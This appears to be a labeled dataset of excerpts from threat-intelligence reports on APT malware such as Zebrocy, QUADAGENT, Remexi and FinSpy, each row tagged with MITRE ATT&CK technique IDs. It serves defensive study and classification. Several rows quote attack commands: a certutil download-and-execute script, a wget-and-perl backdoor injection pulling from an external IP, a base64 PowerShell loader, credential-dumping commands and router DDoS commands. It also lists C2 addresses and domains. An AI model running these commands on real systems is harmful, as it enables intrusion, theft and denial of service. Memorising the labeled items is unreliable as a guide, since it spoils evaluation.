However, if you DO get infected, you’ll want to delete the following registry keys (if they exist): HKLM/System/CurrentControlSet/Services/DirecastX ytasda jrqq HKLM/System/CurrentControlSet/Services/DirectX yta jsdrq HKLM/System/CurrentControlSet/Services/DirectX ytsda jrq Additionally, you’ll want to delete any copies of “svchost.exe” that you find in %Program Files (x86)%/DIFXE/, as these are the dropped copies of the malware	['T1070.004', 'T1112']
However, we were able determine a unique, hard-coded user agent used for the C2 communications: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1) Using AutoFocus, we pivoted from the user agent string to expand our data set to three additional Zebrocy samples using the exact same user agent	['T1087', 'T1543.001']
If that fails, the payload will use DNS tunneling by first issuing a DNS query to resolve the following domain to notify the C2 that the payload will send data to it in subsequent DNS queries:   ns1.<random number between 100000 and 999999>.<c2 name>   The payload will then split the message up into 60-byte chunks (only 1 in this case), which it will send to the C2 via DNS queries to resolve domains structured as:   <encoded/encrypted data of message>.<same random number between 100000 and 999999>.<c2 name>   The payload will notify the C2 that it is done sending data by issuing a DNS query to resolve a domain structured as:   ns2.<same random number between 100000 and 999999>.<c2 name>   Package Comparison of the QUADAGENT Samples The bat2exe version (SHA256: 5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63)has a batch script, PowerShell script, and associated file names embedded within several resources that it will decrypt using RC4 and various MD5 hashes for keys	['T1071', 'T1573', 'T1048', 'T1008']
If the C2 server provides the appropriate echoed data in the response, the Trojan attempts to determine what  commands the C2 wishes to run by issuing a request to the following URL:http://<c2 domain>/what?<hex(Environment.UserName/Environment.MachineName)> After issuing the what command, the Trojan will parse the C2’s response for the string Oops, which the Trojan will treat as the C2 making a mistake and will exit	['T1071', 'T1573', 'T1041', 'T1571', 'T1132', 'T1008', 'T1043']
If the mutex does not exist and a Windows Startup Registry key with name “System Update” does not exist, the malware performs its initialization routine by:  Copying itself to the path %PROGRAMDATA%\svchost.exe Sets the Windows Startup Registry key with the name “System Update” which points to the above dropped payload	['T1112', 'T1547.001']
If there are keys for the string encryption with the XOR algorithm, the configuration data will be also encrypted with the XOR algorithm	['T1573', 'T1027']
If the Trojan receives this echo, it will create the following file that the Trojan uses as a signal that it was able to successfully communicate with its C2 server: %APPDATA%\Windows\ShwDoc.srv If the Trojan determines the C2 server wishes to send a command, it sends an HTTP request to the following URL: hxxp://www.windowspatch[.]com/tahw?<hex(STDOUT of whoami command)> The Trojan will first check the response to this request for the string spoo, which signifies the C2 does not wish to issue a command	['T1071', 'T1008']
If unable to contact the C2 server initially, the shellcode is configured to reattempt communication with the C2 server address in the following pattern:  [a-z][a-z][a-z].stage.14919005.www1.proslr3[.]com VBScript #2 “mshta.exe” further executes the second VBScript “58d2a83f777908.23270411.vbs”, which creates a folder by GUID name inside “Intel” and drops the VBScript payloads and configuration files: \Intel\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\58d2a83f777638.60220156.ini \Intel\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\58d2a83f777688.78384945.ps1 \Intel\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\58d2a83f7776b5.64953395.txt \Intel\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\58d2a83f7776e0.72726761.vbs \Intel\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\58d2a83f777716.48248237.vbs \Intel\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\58d2a83f777788.86541308.vbs \Intel\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\Foxconn.lnk This script then executes “58d2a83f777716.48248237.vbs”, which is a variant of FIN7’s HALFBAKED backdoor	['T1036', 'T1064']
In 2016, CTU researchers observed the group using native system functionality to disable logging processes and delete logs within a compromised environment	['T1562.001', 'T1070.004']
In all of the DropIt samples we collected, the dropper will then save the executable to the user’s %TEMP% folder and execute the file, specifically to one of the following filenames:  %TEMP%\spp.exe %TEMP%\sloo.exe %TEMP%\spoo.exe %TEMP%\vschos.exe  We have also seen Magic Hound using DropIt like a binder Trojan, specifically dropping a legitimate decoy executable along with the malicious executable as a payload	['T1055.012', 'T1036']
"In December 2018, a thread on HackForums described a change in the ownership and ongoing development of the HawkEye keylogger.Shortly following this exchange, new posts began to appear that were attempting to market and sell new versions of HawkEye (HawkEye Reborn v9), with these new posts also referencing the change in ownership of the project moving forward.HawkEye Reborn v9 is currently marketed as an ""Advance Monitoring Solution."" It is currently being sold using a licensing model, with purchasers gaining access to the software and updates for different periods based on a tiered pricing model.HawkEye Reborn v9 also features a Terms of Service agreement that provides some additional insight"	['T1543.003', 'T1008']
Indicators  File  Hash  Description  x.js  3fefa55daeb167931975c22df3eca20a  HOMEFRY, a 64-bit Windows password dumper/cracker  mt.exe  40528e368d323db0ac5c3f5e1efe4889  MURKYTOP, a command-line reconnaissance tool   com4.js  a68bf5fce22e7f1d6f999b7a580ae477  AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages   Historical Indicators  File  Hash  Description  green.ddd  3eb6f85ac046a96204096ab65bbd3e7e  AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages  BGij  6e843ef4856336fe3ef4ed27a4c792b1  Beacon, a commercially available backdoor  msresamn.ttf  a9e7539c1ebe857bae6efceefaa9dd16  PHOTO, also reported as Derusbi  1024-aa6a121f98330df2edee6c4391df21ff43a33604  bd9e4c82bf12c4e7a58221fc52fed705  BADFLICK, backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command-and-control configuration	['T1140']
Indicators of compromise MITRE ATT&CK techniques  Modify existing service Code signing File deletion Deobfuscate/decode files or information System information discovery Process discovery Service execution RunDLL32 Scripting Command-line Interface Data from local system Automated exfiltration Data encrypted Commonly used port Bypass user account control  Hashes  fe32d29fa16b1b71cd27b23a78ee9f6b7791bff3 f684e15dd2e84bac49ea9b89f9b2646dc32a2477 1d280a77595a2d2bbd36b9b5d958f99be20f8e06 19d9573f0b2c2100accd562cc82d57adb12a57ec f90a2155ac492c3c2d5e1d83e384e1a734e59cc0 9b832dda912cce6b23da8abf3881fcf4d2b7ce09 f3b62fea38cb44e15984d941445d24e6b309bc7b 66d2cea01b46c3353f4339a986a97b24ed89ee18 7113aaab61cacb6086c5531a453adf82ca7e7d03 d41daba0ebfa55d0c769ccfc03dbf6a5221e006a 25f4819e7948086d46df8de2eeeaa2b9ec6eca8c 35ab747c15c20da29a14e8b46c07c0448cef4999 e87de3747d7c12c1eea9e73d3c2fb085b5ae8b42 0e4a7c0242b98723dc2b8cce1fbf1a43dd025cf0 bca861a46d60831a3101c50f80a6d626fa99bf16 01530adb3f947fabebae5d9c04fb69f9000c3cef 4229896d61a5ad57ed5c247228606ce62c7032d0 4c7e975f95ebc47423923b855a7530af52977f57 5a6ad7a1c566204a92dd269312d1156d51e61dc4 1dc50bfcab2bc80587ac900c03e23afcbe243f64 003e21b02be3248ff72cc2bfcd05bb161b6a2356 9b7c3c48bcef6330e3086de592b3223eb198744a 85e2453b37602429596c9681a8c58a5c6faf8d0c  Domains  ftp.byethost31.com ftp.byethost11.com 1113427185.ifastnet.org navermail.byethost3.com nihon.byethost3.com	['T1048']
Indirect Code Execution Through INF and SCT This scriptlet code execution technique leveraging INF and SCT files was recently discovered and documented in February 2018	['T1140', 'T1064']
In one incident, the threat actor used the Wrapikatz tool (w.exe) with a usage statement that retrieves various passwords and Windows credentials from memory and compiles them in w.txt: c:\programdata\w.exe –w –l –c>>c:\programdata\w.txt In a separate incident, the threat actor used access provided by extensive web shell deployment to harvest account credentials:  2016-10-03T09:27:47   dir 2016-10-03T09:28:11   w64.log >ppp.log 2016-10-03T09:30:10     PowerShell.exe -ExecutionPolicy Bypass -File getpwd.ps1 >iistail.log  In another example, BRONZE UNION leveraged the Kekeo credential abuse tool to exploit CVE-2014-6324, a vulnerability in Microsoft's implementation of the Kerberos network authentication protocol	['T1003', 'T1068']
In other cases, threat actors placed web shells on externally accessible servers, sometimes behind a reverse proxy, to execute commands on the compromised system	['T1090', 'T1059', 'T1505.003']
In particular, the threat actors have exploited CVE-2011-3544, a vulnerability in the Java Runtime Environment, to deliver the HttpBrowser backdoor; and CVE-2010-0738, a vulnerability in JBoss, to compromise internally and externally accessible assets used to redirect users' web browsers to exploit code	['T1068', 'T1203']
"Interestingly, the attacker has used the >> method to append to the file so there can be multiple outputs written to their single TMP file: ""C:\Windows\system32\cmd.exe"" /C systeminfo >> ""C:\Ahnlab\$$$A24F.TMP""  ""C:\WINDOWS\system32\cmd.exe"" /C tasklist /v >> ""C:\Ahnlab\$$$A24F.TMP""   NavRAT   Capabilities  NavRAT is a remote access trojan (RAT) designed to upload, download and execute files"	['T1074', 'T1105']
In the event this privilege was obtained, the common startup folder is queried by reading the following registry key:  HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Common Startup  Alternatively, if the privilege was unable to be obtained, Reaver.v2 will obtain the user’s startup folder by querying the following registry key:  HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Startup  Reaver proceeds to write a shortcut file to ‘%TEMP%\~WUpdate.lnk’	['T1547.001', 'T1012']
In the following example, archives for exfiltration were renamed as .tmp files:  move \\{FILE PATH}\c$\programdata\AT.part01.rar  \\{FILE PATH}\c$\programdata\at01.tmp The TMP files were then staged for exfiltration on Internet-facing servers that had previously been compromised with the China Chopper web shell	['T1070.004', 'T1074']
In this campaign, the group sent spear phishing emails containing malicious documents that led to the installation of the UPPERCUT backdoor	['T1598.003', 'T1598.002']
"In this particular instance, the following script is retrieved:@echo off  :if exist ""%PROGRAMFILES(x86)%"" (GOTO 64BITOS) ELSE (GOTO 32BITOS)  :32BITOS certutil -urlcache -split -f http://s8877.1apps[.]com/vip/setup.txt > nul certutil -decode -f setup.txt setup.cab > nul del /f /q setup.txt > nul GOTO ISEXIST  :64BITOS :certutil -urlcache -split -f http://s8877.1apps[.]com/vip/setup2.txt > nul :certutil -d^ecode -f setup2.txt setup.cab > nul :del /f /q setup2.txt > nul :GOTO ISEXIST  :ISEXIST  if exist ""setup.cab"" (GOTO EXECUTE) ELSE (GOTO EXIT)  :EXECUTE ver | findstr /i ""10\."" > nul IF %ERRORLEVEL% EQU 0 (GOTO WIN10) ELSE (GOTO OTHEROS)  :WIN10 expand %TEMP%\setup.cab -F:* %CD% > nul :if exist ""%PROGRAMFILES(x86)%"" (rundll32 %TEMP%\drv.dll EntryPoint) ELSE (rundll32 %TEMP%\drv.dll EntryPoint) %TEMP%\install.bat GOTO EXIT  :OTHEROS wusa %TEMP%\setup.cab /quiet /extract:%TEMP% > nul %TEMP%\install.bat GOTO EXIT  :EXIT del /f /q setup.cab > nul del /f /q %~dpnx0 > nulThis script simply checks the operating system of the victim and downloads the respective payload again using the certutil executable"	['T1071', 'T1218.011']
IOCs Domain supservermgr[.]com URL hxxp://supservermgr[.]com/sys/upd/pageupd.php Zebrocy d697160aecf152a81a89a6b5a7d9e1b8b5e121724038c676157ac72f20364edc cba5ab65a24be52214736bc1a5bc984953a9c15d0a3826d5b15e94036e5497df 25f0d1cbcc53d8cfd6d848e12895ce376fbbfaf279be591774b28f70852a4fd8 115fd8c619fa173622c7a1e84efdf6fed08a25d3ca3095404dcbd5ac3deb1f03 f27836430742c9e014e1b080d89c47e43db299c2e00d0c0801a2830b41b57bc1 5b5e80f63c04402d0b282e95e32155b2f86cf604a6837853ab467111d4ac15e2 dd7e69e14c88972ac173132b90b3f4bfb2d1faec15cca256a256dd3a12b6e75d Koadic abbad7acd50754f096fdc6551e728aa6054dcf8e55946f90a02b17db552471ca User Agents Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1) Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1 IPs 185.25.51[.]198 185.25.50[.]93 220.158.216[.]127 92.114.92[.]102 86.106.131[.]177  DDE Docs 85da72c7dbf5da543e10f3f806afd4ebf133f27b6af7859aded2c3a6eced2fd5 8cf3bc2bf36342e844e9c8108393562538a9af2a1011c80bb46416c0572c86ff	['T1087']
Irdsnhrxxxfery64 manipulation on userinit.exe & unins000.exe Injection Technique To Increase Stealthiness After locating one of the target processes, the malware uses Process Hollowing (MITRE Technique T1093) to evasively create a new process from a legitimate source	['T1055.012', 'T1057']
It communicates encoded system information to a single hard coded command and control (C2) server, using the system’s default User-Agent string	['T1082', 'T1071']
It executes the other modules and collects initial information about the machine, including information about the network, locale, and the keyboard language.    The main module collecting information about the machine	['T1082', 'T1016', 'T1087']
It has the capability to find files, enumerate drives, exfiltrate data, take screenshots and provide a reverse shell	['T1113', 'T1083']
It sets keyboard and mouse hooks to its handlekeys() and MouseHookProc() functions respectively and starts several working threads:    ID Thread description   1 Gets commands from C2 and saves them to a file and system registry using the bitsadmin.exe utility   2 Decrypts command from registry using RC4 with a hardcoded key, and executes it   3 Transfers screenshots from the clipboard to \Cache005 subdirectory and Unicode text from clipboard to log.txt, XOR-ed with the “salamati” key (“health” in Farsi)   4 Transfers screenshots to \Cache005 subdirectory with captureScreenTimeOut and captureScreenTimeOut frequencies   5 Checks network connection, encrypts and sends gathered logs   6 Unhooks mouse and keyboard, removes bitsadmin task   7 Checks if malware’s working directory size already exceeds its threshold   8 Gathers victim´s credentials, visited website cache, decrypted Chrome login data, as well as Firefox databases with cookies, keys, signons and downloads    The malware uses the following command to receive data from its C2:       bitsadmin.exe /TRANSFER HelpCenterDownload /DOWNLOAD /PRIORITY normal <server> <file>http://<server_config>/asp.asp?ui=<host_name>nrg-<adapter_info>-<user_name>     Activity logging module (Splitter.exe) This module is called from the main thread to obtain screenshots of windows whose titles are specified in the configuration CaptureSites field, bitmaps and text from clipboard, etc	['T1113', 'T1115']
It then creates the following registry key to automatically run the Trojan each time the system starts: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\@RANDOM@ The main behavior carried out by this Trojan involves obtaining an embedded executable, hollowing the current Trojan, writing the new embedded executable to the process memory and calling a specific function in the newly written payload	['T1055.012', 'T1547.001']
It then launches player.exe, a CozyDuke dropper maintaining anti-detection techniques: 3d3363598f87c78826c859077606e514,player.exe,338kb,Trojan.Win32.CozyBear.v,CompiledOn:2014.07.02 21:13:33 Anti-detection and trojan functionality The file collects system information, and then invokes a WMI instance in the root\securitycenter namespace to identify security products installed on the system, meaning that this code was built for x86 systems, wql here: SELECT * FROM AntiVirusProduct SELECT * FROM FireWallProduct The code hunts for several security products to evade: CRYSTAL KASPERSKY SOPHOS DrWeb AVIRA COMODO Dragon In addition to the WMI/wql use, it also hunts through the “SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\” registry key looking for security products to avoid	['T1518.001', 'T1036']
JAVASCRIPT CODE SNIPPETS:  The first stage JavaScript copies additional JavaScript code snippets in txt format from the RTF document into a random directory “C:\Users\<User Name>\<Random guid>\”	['T1033', 'T1064']
Just like in the sandbox checks, the Trojan checks for an attached debugger each time it issues a DNS query; if it does detect a debugger it will issue a DNS query to resolve 676f6f646c75636b.gogle[.]co	['T1518.001', 'T1124', 'T1497']
Lateral Movement, Maintain Presence, and Complete Mission APT39 facilitates lateral movement through myriad tools such as Remote Desktop Protocol (RDP), Secure Shell (SSH), PsExec, RemCom, and xCmdSvc	['T1021.001', 'T1021']
Like the ChinaChopper web shell, the OwaAuth web shell requires a password	['T1059', 'T1505.003']
Malware  Capabilities  WINDSHIELD   Command and control (C2) communications via TCP raw sockets Four configured C2s and six configured ports – randomly-chosen C2/port for communications Registry manipulation Get the current module's file name Gather system information including registry values, user name, computer name, and current code page File system interaction including directory creation, file deletion, reading, and writing files Load additional modules and execute code Terminate processes Anti-disassembly   KOMPROGO   Fully-featured backdoor capable of process, file, and registry management Creating a reverse shell File transfers Running WMI queries Retrieving information about the infected system   SOUNDBITE   C2 communications via DNS Process creation File upload Shell command execution File and directory enumeration/manipulation Window enumeration Registry manipulation System information gathering   PHOREAL   C2 communications via ICMP Reverse shell creation Filesystem manipulation Registry manipulation Process creation File upload   BEACON (Cobalt Strike)   Publicly available payload that can inject and execute arbitrary code into processes Impersonating the security context of users Importing Kerberos tickets Uploading and downloading files Executing shell commands Configured with malleable C2 profiles to blend in with normal network traffic Co-deployment and interoperability with Metasploit framework SMB Named Pipe in-memory backdoor payload that enables peer-to-peer C2 and pivoting over SMB    Table 3: APT32 Malware and Capabilities APT32 operators appear to be well-resourced and supported as they use a large set of domains and IP addresses as command and control infrastructure	['T1041']
Newer HttpBrowser versions use SSL with self-signed certificates to encrypt network communications	['T1553.002', 'T1573']
Obfuscation Mechanism for the JScript Code The malicious JScript code obfuscation relies on two main techniques	['T1140', 'T1027']
"Office365DCOMCheck.ps1 and SystemDiskClean.ps1):       wscript.exe ""Office365DCOMCheck.vbs"" \""PowerShell.exe  -ExecutionPolicy bypass -WindowStyle hidden -NoProfile '<current PowerShell script>'  \""     After setting up persistent access, the payload checks to see if a value exists within a registry key in the HKCU hive whose name is the same as the scheduled task (ex"	['T1036', 'T1012']
"Office365DCOMCheck.vbs or SystemDiskClean.vbs) within the %TEMP% folder:       CreateObject(""WScript.Shell"").Run """" & WScript.Arguments(0) & """", 0, False     The scheduled task will then run every five minutes, which provides persistent execution of the downloader script"	['T1053.005', 'T1059', 'T1064', 'T1547.001']
"Old Comnie Variant C2 Decoder      12345678910111213141516171819  import requestsimport sysimport redef decode(data):  o = """"  for c in data:    if c == ""*"":      o += "".""    elif c == ""|"":      o += "":""    elif c == ""+"":      o += "";""    else:      o += chr(ord(c)-49)  return or = requests.get(sys.argv[1])fd = r.textdata = fd.split(""++a++"")[1].split(""++a++"")[0]print(decode(data))       Samples Analyzed eed5945c36ba22a2531dd2d9dd7bc4e17e68544d512be75670919caf287c1b4a 8026442b812469e48ccd11611ab6eacdcb312a8f1aabd563b7f4cb4868315e16 c8951038fd53321661274e5a12532c3fb6f73c75fd75503a1089c56990658fef 48a1ce103e5bf47c47cc5ed40b2dc687ebaf3674d667419287bcb1d0b8d8dda6 e06b797a24fa03a77e0d5f11b0cf0f4f038e0a9ea04d4981d39148969349c79c 7282d0709449abe16457864f58157cac8d007571dc5d463d393d1ae2605d17e0 bf6ee8426245b167a69292e513c0841d818b310dda87daea649221f4e0afd1b3 62b98dde60cb4dd0d0088bde222c5c2c4c92560cccf4753f1ce94e044093ab85 756952652290ad09fe03c8674d44eab2077b091398187c3abcb6f1ddc462c32d 639a49390c6f8597d36ec0bd245efa1b4a078c0506fb515e577a40389b39a614 29ed6eb3c882b018c2bb6bf2f8eb15069dc5510ca119abebf24f09e3c91f10aa 0e8a4e4d5ca501bad25a730fb5de534fa324c6ac23e0a573524693f2d996d105 316a0c6849f183a1a52d0c7648e722c4ca85bd57b0804a147c0c8656b84bbdb9   Identified C2s 121.126.211[.]94:8080 113.196.70[.]11:80,8080 133.130.101[.]47:443 123.51.208[.]157:443;8000;8080   C2 Hosting URLs (DDR URLs) github[.]com/korlee5643 itsmonsee.tumblr[.]com allworldnewsway.blogspot[.]com"	['T1043']
Once all the tasks have been executed completely, the malware breaks the loop, sends the termination buffer back, and clears all the footprints from the targeted machine:  Deletes the LNK file from the startup directory	['T1070.004', 'T1547.009']
Once the payload is successfully executed, it will proceed to copy files to the following locations:  C:\ProgramData\ManagerApp\AdapterTroubleshooter.exe C:\ProgramData\ManagerApp\15b937.cab C:\ProgramData\ManagerApp\install.cab C:\ProgramData\ManagerApp\msvcr90.dll C:\ProgramData\ManagerApp\d3d9.dll  The “AdapterTroubleshooter.exe” file is a legitimate binary which is leveraged to use the famous DLL search order hijacking technique.  The “d3d9.dll” file is malicious and is loaded into memory by the legit binary upon execution.  Once loaded, the DLL will then inject FinSpy into the Winlogon process	['T1055', 'T1574.001', 'T1574.002']
One such email that we were able to obtain was targeting users in Turkey, as shown in Figure 4:    Figure 4: Sample spear phishing email containing macro-based document attachment The malicious Microsoft Office attachments that we observed appear to have been specially crafted for individuals in four countries: Turkey, Pakistan, Tajikistan and India	['T1598.002', 'T1204']
OopsIE Trojan Analysis The OopsIE Trojan delivered in these attacks is packed with SmartAssembly and further obfuscated with ConfuserEx v1.0.0	['T1027.002', 'T1027']
Our analysis of the backdoors used in the September 2018 attacks show that AuditCred.dll/ROptimizer.dll was similarly used:      FileTokenBroker.dll  (2017 attack) AuditCred.dll/Roptimizer.dll  (2018 attack)   Launch Method Service Service   Function Loader Component Loader Component   Working directory %Windows%\System32 %Windows%\System32   Loaded Component Path %Windows%\System32\en-US %Program Files%\Common Files\System\ado   Loaded Component Blending Blends with .mui files Blend with ActiveX data Object dll files    Table1: Similarities of the Loader components in both incidents Analysis of backdoors used in 2018 The Lazarus group used a series of backdoors in their 2018 attacks, employing a complicated technique that involves three major components:  AuditCred.dll/ROptimizer.dll (detected by Trend Micro as BKDR_BINLODR.ZNFJ-A) – loader DLL that is launched as a service Msadoz<n>.dll (detected by Trend Micro as BKDR64_BINLODR.ZNFJ-A) – encrypted backdoor n = number of characters in the loader dll’s filename Auditcred.dll.mui/rOptimizer.dll.mui (detected by Trend Micro as TROJ_BINLODRCONF.ZNFJ-A) – encrypted configuration file   Figure 1: Loading sequence of the modularized backdoor The loader DLL is installed as a service and uses different names (AuditCred and ROptimizer) on different machines	['T1055', 'T1574.001', 'T1218.011', 'T1574.002']
Our observation of related actions here:    u ps start password stealing (Windows)   Ps_mps/ps_hwi start start password stealing (Linux, MIPS,  ARM)   uper_mps/uper_hwi start rewrite hook module with a new version and launch it (Linux, MIPS, ARM)   Nm_mps/nm_hwi start  –ban -middle Scan ports and retrieve banners on the router subnet  (Linux, MIPS,  ARM)   U fsget * 7 *.docx, *.pdf, *.doc * search for docs with the given filetypes (Windows)   S sinfo retrieve information on installed programs and launch commands: systeminfo, tasklist, ipconfig, netstat, route print, tracert www.google.com (Windows)   weap_mps/weap_hwi host188.128.123.52 port[25,26,110,465,995]  typetcpconnect DDoS on 188.128.123.52 (Linux, MIPS,  ARM)   weap_mps/weap_hwi  typesynflood port80 cnt100000 spdmedium host212.175.109.10 DDoS on 212.175.109.10 (Linux, MIPS,  ARM)    The issued commands for the Linux plugins suggest the attackers controlled infected MIPS/ARM devices. We want to pay special attention to the DDoS commands meant for these routers	['T1003']
Part of packed VM PCODE After unpacking, the PCODE it will look like the following: Unpacked PCODE After unpacking the virtual machine PCODE is then decrypted: Decrypted VM PCODE The custom virtual machine supports a total of 34 instructions: Example of parsed PCODE In this example, the “1b” instruction is responsible for executing native code that is specified in parameter field	['T1140', 'T1027.001', 'T1027.002', 'T1497']
Persistence Mechanism Figure 3 shows that for persistence, the document creates two scheduled tasks and creates one auto-start registry entry pointing to the LNK file	['T1053.005', 'T1547.001']
POSHSPY WMI Component The WMI component of the POSHSPY backdoor leverages a Filter to execute the PowerShell component of the backdoor on a regular basis	['T1047', 'T1059.001']
powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\ProgramData\ZIPSDK\ProjectConfManagerNT.ini))));  PowerShell one-liner Encoded text file Execution flow:  The PowerShell code When PowerShell is invoked whether via WMI, wscript.exe, or mshta.exe, it executes a one-liner PowerShell code (as outlined above) that reads the encoded text file dropped in ProgramData and then decodes it	['T1036', 'T1059.001']
PowerShell Script “58d2a83f777942.26535794.ps1” is a multilayer obfuscated PowerShell script, which launches shellcode for a Cobalt Strike stager	['T1027', 'T1059.001']
Previous related research: https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html?m=1 https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/ https://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-government_entity/ https://www.sekoia.fr/blog/falling-on-muddywater/  Decoy images by country Jordan     The Hashemite Kingdom of Jordan, Ministry of Justice (mwjo.doc) DAMAMAX.doc    Turkey     Turkey’s General Directorate of Security Turkey’s Directorate General of Coastal Safety        Turkey’s General Directorate of Security (Onemli Rapor.doc) Turkey’s Ministry of the Interior (Early election.doc)    Saudi Arabia Document signed by the Major General Pilot, commander of the Saudi Royal Air Force     KSA King Saud University (KSU) KSA King Saud University (KSU)    Azerbaijan İnkişaf üçün görüş.doc (meeting for development) Iraq     Iraqi Ministry of Foreign Affairs Government of Iraq, the Treasury of the Council of Ministers    Pakistan     ECP.doc National Assembly of Pakistan.doc        P.Police.doc     Afghanistan President.doc, E-government of Afghanistan Technical details Below is a description of the malware extraction and execution flow, starting from the initial infection vector, running VBA code via a macro and then dropping the PowerShell code that establishes command-center communications, sends victim system information and then receives commands supported by the malware	['T1071']
Probably full and active window screenshot quality   captureActiveQC 40   CaptureSites VPN*0,0 Login*0,0 mail*0,0 Security*0,0 Window titles of interest for screenshots, using left mouse button and Enter keypress hook   important upLog.txt upSCRLog.txt upSpecial.txt upFile.txt upMSLog.txt List of files to send to C2 using bitsadmin.exe from the dedicated thread   maxUpFileSizeKByte 1000000 Maximum size of file uploaded to C2   Servers http://108.61.189.174 Control server HTTP URL   ZipPass KtJvOXulgibfiHk Password for uploaded zip archives   browserPasswordCheckTimeout 300000 Milliseconds to wait between gathering key3.db, cookies.sqlite and other browser files in dedicated thread    Most of the parameters are self-explanatory	['T1071', 'T1041']
Procmon shows the malicious module loaded using the regsvr32.exe process.   Phase two: Payload Analysis    The only module the XSL script loads is Irdsnhrxxxfery64, which is packed using the UPX packer	['T1218.010', 'T1027.002']
RAR Creates RAR files per logical drive containing data with timestamps for the past 7 days, then uploads RAR to the C2 server using a POST command at the path “/FeedBack.php”	['T1041', 'T1560']
Read a specified file’s contents and send the data to the control server Write data sent by the control server to an existing file Mark a file to be deleted on reboot  Marking a file for deletion on reboot	['T1070.006', 'T1041']
Reaver.v1 has been observed delivering a payload that uses HTTP for network communication, while versions 2 and 3 use a payload that uses raw TCP connections for this communication	['T1071', 'T1049']
Reaver will then install itself as a service in the event it is running with SeDebugPrivilege privileges.  The service is configured with a name, description, and display name that is provided within the configuration	['T1007', 'T1543.003']
Registry key “Software\Microsoft\Windows\CurrentVersion\Internet Settings\” is queried to gather proxy information with values ProxyEnable, Proxy: (NO), Proxy, ProxyServer	['T1090', 'T1012']
Remexi includes different modules that it deploys in its working directory, including configuration decryption and parsing, launching victim activity logging in a separate module, and seven threads for various espionage and auxiliary functions	['T1562.001', 'T1083']
RIPTIDE’s first communication with its C2 server fetches an encryption key, and the RC4 encryption key is used to encrypt all further communication	['T1573']
SA  Generates the following IRC client command that will be sent to the C2 server: PRIVMSG <username> : Hello ,my name is  <IRC USER name>, Im ready my Computer Name is:<computer name>    All of the commands, except for the VER command, must be issued by individuals in the IRC channel with nicknames that start with “AS_” or “AF_”	['T1033', 'T1082']
Sample(s) f1b2bc0831445903c0d51b390b1987597009cc0fade009e07d792e8d455f6db0 5cc62ad6baf572dbae925f701526310778f032bb4a54b205bada78b1eb8c479c   DNS tbs1/tbs2.microsoftonline.services   Domains 0ffice365[.]agency    0ffice365[.]life    0ffice365[.]services    0nedrive[.]agency    corewindows[.]agency    microsoftonline[.]agency    onedrive[.]agency    sharepoint[.]agency    skydrive[.]agency    skydrive[.]services   Sample eb33a96726a34dd60b053d3d1048137dffb1bba68a1ad6f56d33f5d6efb12b97   DNS tvs1/tvs2.trafficmanager.live   Domains akamaiedge[.]live     akamaized[.]live     akdns[.]live     edgekey[.]live    Table 7: Sample and Domain Associations The third cluster of domains had six different nameservers associated with them, but unlike the other two clusters, were all directly tied to each other	['T1007', 'T1543.003']
Screen capture and audio recording  SpyNote RAT was able to take screen captures and, using the device’s microphone, listen to audio conversations	['T1113', 'T1123']
SCT File Analysis The code of the Defender.sct file is an obfuscated JavaScript	['T1064', 'T1027']
SECOND STAGE JAVASCRIPT INTO POWERSHELL: The second stage JavaScript creates a PowerShell file with the same name in the same directory	['T1064', 'T1547.001', 'T1059.001']
Service providers have significant access to customer networks, enabling an attacker who had compromised a service provider to move laterally into the network of the service provider’s customer	['T1543.003', 'T1021']
Serving the backdoor  Another HTTP request is sent to the targeted server, with the following resource: /?module=wget hxxp://67[.]209.177.163/ibus -O /tmp/e3ac24a0bcddfacd010a6c10f4a814bc The above standard injection pulls the ibus payload and stores it on /tmp/e3ac24a0bcddfacd010a6c10f4a814bc  Launching the backdoor  The execution is issued using an additional HTTP request: /?module=perl /tmp/ e3ac24a0bcddfacd010a6c10f4a814bc;sleep 2;rm -rf /tmp/ e3ac24a0bcddfacd010a6c10f4a814bc That executes the perl script, puts it to sleep for two seconds and deletes the file to remove any evidence	['T1070.004', 'T1074']
Similar to the previous case, if Avast and aswrundll.exe are on the machine, Irdsnhrxxxfery98 will be injected into that process instead of regsvr32.exe.   Irdsnhrxxxfery64 injecting lrdsnhrxxfery98	['T1055', 'T1218.010']
Since Operation Clandestine Fox, we have observed this actor execute multiple attacks that did not rely on zero-day exploits. The combination of this sustained operational tempo and lack of zero-day exploits may indicate that this group has changed strategy and has decided to attack more frequently and does not have steady access to zero-day exploit code. No matter the strategy, this actor has shown an ability to operate successfully	['T1068', 'T1203']
Some of the instances used in this script are: $eNv:puBLic[13]+$ENv:pUBLIc[5]+'x' ($ENV:cOMsPEC[4,26,25]-jOin'')      XOR encoding: The biggest section of the PowerShell script is XOR encoded using a single byte key, as shown in Figure 11	['T1573', 'T1027']
